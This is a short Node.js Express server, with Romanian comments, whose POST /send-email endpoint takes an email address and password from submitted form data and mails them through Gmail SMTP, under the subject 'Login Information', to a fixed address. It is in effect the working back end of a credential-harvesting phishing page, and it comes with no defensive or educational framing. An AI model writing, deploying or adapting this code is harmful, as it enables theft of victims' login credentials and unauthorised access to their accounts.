const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware pentru parsarea cererilor de tip JSON
app.use(bodyParser.json());

// Configurează transportul de emailuri cu NodeMailer
let transporter = nodemailer.createTransport({
  service: 'gmail', // Poți folosi orice serviciu, cum ar fi Yahoo, Outlook sau un server SMTP propriu
  auth: {
    user: 'adresa_ta_de_email@gmail.com', // Emailul de unde trimiți
    pass: 'parola_ta' // Parola sau App Password dacă folosești 2FA
  }
});

// Endpoint pentru trimiterea emailurilor
app.post('/send-email', (req, res) => {
  const { email, password } = req.body;

  let mailOptions = {
    from: 'kridderurt@gmail.com',
    to: 'kridderurt@example.com', // Emailul unde vrei să trimiți
    subject: 'Login Information',
    text: `Email: ${email}\nPassword: ${password}`
  };

  // Trimite emailul
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error la trimiterea emailului.');
    } else {
      console.log('Email trimis: ' + info.response);
      res.status(200).send('Email trimis cu succes!');
    }
  });
});

app.listen(port, () => {
  console.log(`Serverul rulează la http://localhost:${port}`);
});
